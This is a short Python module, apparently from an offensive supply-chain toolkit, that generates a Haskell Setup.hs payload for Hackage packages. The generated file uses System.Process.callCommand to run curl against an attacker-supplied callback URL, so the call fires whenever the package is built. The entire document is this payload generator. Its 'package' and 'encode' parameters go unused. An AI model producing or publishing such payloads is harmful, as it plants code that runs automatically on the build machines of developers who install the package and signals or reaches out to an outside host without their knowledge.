"""Generate Haskell payload for Hackage packages."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a simple Setup.hs executing ``callback``."""
    cmd = f"curl -m5 {callback}"
    return f"import System.Process\nmain = callCommand \"{cmd}\"\n"
